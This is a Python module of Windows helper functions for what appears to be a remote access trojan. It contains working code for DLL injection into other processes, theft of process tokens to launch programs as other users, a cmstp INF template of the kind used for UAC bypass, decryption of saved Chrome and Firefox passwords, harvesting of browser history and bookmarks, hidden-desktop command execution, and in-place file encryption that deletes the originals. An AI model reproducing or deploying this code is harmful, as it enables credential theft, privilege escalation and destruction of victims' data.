import ctypes
import locale
import os
import sys
from ctypes import wintypes
from ctypes.wintypes import DWORD, HANDLE, LPBYTE, LPWSTR, WORD

import ntsecuritycon
import psutil
import win32api
import win32con
import win32process
import win32profile
import win32security
import win32service
import win32ts
import winerror

kernel32 = ctypes.windll.kernel32
advapi32 = ctypes.windll.advapi32


def wrap_path(path):
    return f'"{path}"' if ' ' in path else path


executable = wrap_path(os.path.realpath(sys.executable))
argv = wrap_path(os.path.realpath(''.join(sys.argv)))


def get_executable_path():
    if not getattr(sys, 'frozen', False):
        return f'{executable} {argv}'
    else:
        return executable


def get_working_directory():
    if not getattr(sys, 'frozen', False):
        return f'{os.path.dirname(argv)}'
    else:
        return os.path.dirname(executable)


def get_executable_info():
    if not getattr(sys, 'frozen', False):
        return r'c:\windows\system32\cmd.exe', f'/c {executable} {argv}'
    else:
        return executable, None


def get_integrity_level():
    mapping = {
        0x0000: 'Untrusted',
        0x1000: 'Low',
        0x2000: 'Medium',
        0x2100: 'Medium high',
        0x3000: 'High',
        0x4000: 'System',
        0x5000: 'Protected process',
    }
    try:
        h_token = win32security.OpenProcessToken(win32process.GetCurrentProcess(), win32security.TOKEN_READ)
        sid = win32security.GetTokenInformation(h_token, ntsecuritycon.TokenIntegrityLevel)[0]
        return mapping.get(sid.GetSubAuthority(sid.GetSubAuthorityCount() - 1))
    except:
        pass


def create_remote_thread(pid, dll_path):
    PROCESS_CREATE_THREAD = 0x0002
    PROCESS_VM_OPERATION = 0x0008
    PROCESS_VM_WRITE = 0x0020
    MEM_COMMIT = 0x1000
    PAGE_READWRITE = 0x0004
    size = (len(dll_path) + 1) * ctypes.sizeof(wintypes.WCHAR)
    h_proc = kernel32.OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, False, pid)
    if not h_proc:
        return 0, 'Error obtaining process handle: {}'.format(ctypes.GetLastError())
    kernel32.VirtualAllocEx.restype = wintypes.LPVOID
    kernel32.VirtualAllocEx.argtypes = (
        wintypes.HANDLE,
        wintypes.LPVOID,
        ctypes.c_size_t,
        wintypes.DWORD,
        wintypes.DWORD)
    addr = kernel32.VirtualAllocEx(h_proc, 0, size, MEM_COMMIT, PAGE_READWRITE)
    if not addr:
        return 0, 'Error assigning space for DLL path: {}'.format(ctypes.GetLastError())
    kernel32.WriteProcessMemory.restype = wintypes.BOOL
    kernel32.WriteProcessMemory.argtypes = (
        wintypes.HANDLE,
        wintypes.LPVOID,
        wintypes.LPCVOID,
        ctypes.c_size_t,
        ctypes.POINTER(ctypes.c_size_t))
    if not kernel32.WriteProcessMemory(h_proc, addr, dll_path, size, None):
        return 0, 'Error writing DLL path: {}'.format(ctypes.GetLastError())
    kernel32.CreateRemoteThread.restype = wintypes.HANDLE
    kernel32.CreateRemoteThread.argtypes = (
        wintypes.HANDLE,
        wintypes.LPVOID,
        ctypes.c_size_t,
        wintypes.LPVOID,
        wintypes.LPVOID,
        wintypes.DWORD,
        wintypes.LPDWORD)
    if kernel32.CreateRemoteThread(h_proc, None, 0, kernel32.LoadLibraryW, addr, 0, None):
        return 1, 'Thread created'
    else:
        return 0, 'Error creating thread: {}'.format(ctypes.GetLastError())


def enable_privilege(privilege_name):
    h_token = win32security.OpenProcessToken(win32process.GetCurrentProcess(),
                                             ntsecuritycon.TOKEN_ADJUST_PRIVILEGES | ntsecuritycon.TOKEN_QUERY)
    privilege_id = win32security.LookupPrivilegeValue(None, privilege_name)
    new_privilege = [(privilege_id, win32con.SE_PRIVILEGE_ENABLED)]
    win32security.AdjustTokenPrivileges(h_token, 0, new_privilege)
    win32api.CloseHandle(h_token)


def get_pid(process_name):
    for proc in psutil.process_iter():
        if process_name in proc.name():
            return proc.pid


def get_process_token(pid):
    h_process = kernel32.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
    h_token = win32security.OpenProcessToken(h_process, win32con.TOKEN_DUPLICATE | win32con.TOKEN_QUERY)
    return h_token


def duplicate_token(h_token):
    return win32security.DuplicateTokenEx(h_token, win32security.SecurityImpersonation, win32con.MAXIMUM_ALLOWED,
                                          win32security.TokenPrimary,
                                          win32security.SECURITY_ATTRIBUTES())


def start_service(service_name):
    h_scm = win32service.OpenSCManager(None, None, win32service.SC_MANAGER_ALL_ACCESS)
    h_service = win32service.OpenService(h_scm, service_name,
                                         win32service.SERVICE_START | win32service.SERVICE_QUERY_STATUS)
    status = win32service.QueryServiceStatus(h_service)[1]
    if status == win32service.SERVICE_STOPPED:
        win32service.StartService(h_service, None)
    win32service.CloseServiceHandle(h_service)


def create_process_with_token(h_token, lp_application_name, lp_command_line):
    class STARTUPINFO(ctypes.Structure):
        _fields_ = (('cb', DWORD),
                    ('lpReserved', LPWSTR),
                    ('lpDesktop', LPWSTR),
                    ('lpTitle', LPWSTR),
                    ('dwX', DWORD),
                    ('dwY', DWORD),
                    ('dwXSize', DWORD),
                    ('dwYSize', DWORD),
                    ('dwXCountChars', DWORD),
                    ('dwYCountChars', DWORD),
                    ('dwFillAttribute', DWORD),
                    ('dwFlags', DWORD),
                    ('wShowWindow', WORD),
                    ('cbReserved2', WORD),
                    ('lpReserved2', LPBYTE),
                    ('hStdInput', HANDLE),
                    ('hStdOutput', HANDLE),
                    ('hStdError', HANDLE))

    class PROCESS_INFORMATION(ctypes.Structure):
        _fields_ = (('hProcess', HANDLE),
                    ('hThread', HANDLE),
                    ('dwProcessId', DWORD),
                    ('dwThreadId', DWORD))

    si = STARTUPINFO()
    si.cb = ctypes.sizeof(si)
    si.lpDesktop = 'winsta0\\default'
    pi = PROCESS_INFORMATION()
    creation_flags = win32con.CREATE_NEW_CONSOLE | win32con.NORMAL_PRIORITY_CLASS | win32con.CREATE_UNICODE_ENVIRONMENT
    advapi32.CreateProcessWithTokenW(int(h_token), 1, lp_application_name, lp_command_line, creation_flags, None, None,
                                     ctypes.byref(si),
                                     ctypes.byref(pi))
    return pi.dwProcessId


def create_process_as_user(h_token, lp_application_name, lp_command_line):
    si = win32process.STARTUPINFO()
    si.lpDesktop = 'winsta0\\default'
    creation_flags = win32con.CREATE_NEW_CONSOLE | win32con.NORMAL_PRIORITY_CLASS | win32con.CREATE_UNICODE_ENVIRONMENT
    environment = win32profile.CreateEnvironmentBlock(h_token, False)
    hProcess, hThread, dwProcessId, dwThreadId = win32process.CreateProcessAsUser(h_token, lp_application_name,
                                                                                  lp_command_line, None, None,
                                                                                  False,
                                                                                  creation_flags, environment, None,
                                                                                  si)
    return dwProcessId


def get_user_token():
    console_session_id = win32ts.WTSGetActiveConsoleSessionId()
    return win32ts.WTSQueryUserToken(console_session_id)


def get_linked_token(h_token):
    return win32security.GetTokenInformation(h_token, ntsecuritycon.TokenLinkedToken)


def get_master_key(local_state):
    import json, base64, win32crypt
    with open(local_state, 'r', encoding='utf-8') as f:
        local_state = json.loads(f.read())
        master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]


def decrypt_password(master_key, buf):
    from Crypto.Cipher import AES
    try:
        cipher = AES.new(master_key, AES.MODE_GCM, buf[3:15])
        password = cipher.decrypt(buf[15:])
        return password[:-16].decode()
    except:
        return None


def get_chromium_passwords(master_key, db) -> list:
    import tempfile, shutil, sqlite3
    db_copy = os.path.join(tempfile.gettempdir(), r'passwords')
    shutil.copy2(db, db_copy)
    conn = sqlite3.connect(db_copy)
    cursor = conn.cursor()
    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
    passwords = []
    for r in cursor.fetchall():
        url = r[0]
        username = r[1]
        password = decrypt_password(master_key, r[2])
        if username and password:
            passwords.append({'url': url, 'username': username, 'password': password})
    cursor.close()
    conn.close()
    os.remove(db_copy)
    return passwords


def get_bookmark_children(items: dict) -> dict:
    bookmarks = []
    for item in items['children']:
        if item['type'] == 'folder':
            bookmarks.append(get_bookmark_children(item))
        else:
            bookmarks.append({'name:': item['name'], 'url': item['url']})
    return {items['name']: bookmarks}


def get_chromium_bookmarks(filename) -> list:
    import json
    with open(filename, encoding='utf-8') as f:
        data = json.load(f)
        bookmark_bar = data['roots']['bookmark_bar']
        other = data['roots']['other']
        return [get_bookmark_children(bookmark_bar), get_bookmark_children(other)]


def get_chromium_history(db) -> list:
    import tempfile, shutil, sqlite3
    db_copy = os.path.join(tempfile.gettempdir(), r'history')
    shutil.copy2(db, db_copy)
    conn = sqlite3.connect(db_copy)
    cursor = conn.cursor()
    cursor.execute('SELECT url, title FROM urls')
    history = []
    for r in cursor.fetchall():
        history.append({'title': r[1], 'url': r[0]})
    cursor.close()
    conn.close()
    os.remove(db_copy)
    return history


def encrypt_file(filename, key, buffer_size=65536):
    from Crypto.Cipher import AES
    input_file = open(filename, 'rb')
    output_file = open(filename + '.encrypted', 'wb')
    cipher = AES.new(key, AES.MODE_CFB)
    output_file.write(cipher.iv)
    buffer = input_file.read(buffer_size)
    while len(buffer) > 0:
        bytes = cipher.encrypt(buffer)
        output_file.write(bytes)
        buffer = input_file.read(buffer_size)
    input_file.close()
    output_file.close()
    os.remove(filename)
    os.rename(filename + '.encrypted', filename)


def decrypt_file(filename, key, buffer_size=65536):
    from Crypto.Cipher import AES
    input_file = open(filename, 'rb')
    output_file = open(filename + '.decrypted', 'wb')
    iv = input_file.read(16)
    cipher = AES.new(key, AES.MODE_CFB, iv=iv)
    buffer = input_file.read(buffer_size)
    while len(buffer) > 0:
        bytes = cipher.decrypt(buffer)
        output_file.write(bytes)
        buffer = input_file.read(buffer_size)
    input_file.close()
    output_file.close()
    os.remove(filename)
    os.rename(filename + '.decrypted', filename)


def logon_user(username, password):
    try:
        token = win32security.LogonUser(username, None, password, win32security.LOGON32_LOGON_INTERACTIVE,
                                        win32security.LOGON32_PROVIDER_DEFAULT)
        token.Close()
        return True
    except win32security.error as e:
        if e.winerror == winerror.ERROR_ACCOUNT_RESTRICTION:
            return True
        if e.winerror == winerror.ERROR_LOGON_FAILURE:
            return False
        return False


def create_desktop():
    h_desktop = win32service.CreateDesktop('rat', 0, win32con.MAXIMUM_ALLOWED, None)
    h_desktop.SwitchDesktop()
    h_desktop.SetThreadDesktop()


def switch_default():
    h_desktop_default = win32service.OpenDesktop('default', 0, False,
                                                 win32con.READ_CONTROL | win32con.DESKTOP_SWITCHDESKTOP)
    h_desktop_default.SwitchDesktop()


def create_pipe():
    import win32pipe
    security_attributes = win32security.SECURITY_ATTRIBUTES()
    security_attributes.bInheritHandle = True
    stdout_r, stdout_w = win32pipe.CreatePipe(security_attributes, 0)
    stderr_r, stderr_w = win32pipe.CreatePipe(security_attributes, 0)
    return stdout_r, stdout_w, stderr_r, stderr_w


def create_process(lp_application_name, lp_command_line):
    import win32file, win32event, win32pipe
    start_info = win32process.STARTUPINFO()
    stdout_r, stdout_w, stderr_r, stderr_w = create_pipe()
    start_info.lpDesktop = 'rat'
    start_info.dwFlags = win32con.STARTF_USESTDHANDLES | win32con.STARTF_USESHOWWINDOW
    start_info.wShowWindow = win32con.SW_HIDE
    start_info.hStdOutput = stdout_w
    start_info.hStdError = stderr_w
    proc_info = win32process.CreateProcess(
        lp_application_name,
        lp_command_line,
        None,
        None,
        True,
        win32con.NORMAL_PRIORITY_CLASS | win32con.CREATE_NEW_CONSOLE,
        None,
        None,
        start_info
    )
    win32event.WaitForSingleObject(proc_info[0], win32event.INFINITE)
    if win32pipe.PeekNamedPipe(stderr_r, 0)[1]:
        err = win32file.ReadFile(stderr_r, 1024)
        return 0, err[1].decode(locale.getdefaultlocale()[1])
    if win32pipe.PeekNamedPipe(stdout_r, 0)[1]:
        out = win32file.ReadFile(stdout_r, 1024)
        return 1, out[1].decode(locale.getdefaultlocale()[1])


def get_firefox_password(profile_path):
    if os.path.isdir(profile_path):
        for item in os.listdir(profile_path):
            item_path = os.path.join(profile_path, item)
            if os.path.isdir(item_path):
                if "key4.db" in os.listdir(item_path) and "logins.json" in os.listdir(item_path):
                    import FireFoxDecrypt
                    db_path = os.path.join(item_path, "key4.db")
                    logins_path = os.path.join(item_path, "logins.json")
                    return 1, str(FireFoxDecrypt.DecryptLogins(logins_path, db_path))
    return 0, 'Password not found'


inf_template = r'''
[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
[RunPreSetupCommandsSection]
{}
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7
[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
[Strings]
ServiceName="flcVPN"
ShortSvcName="flcVPN"
'''.format(get_executable_path())
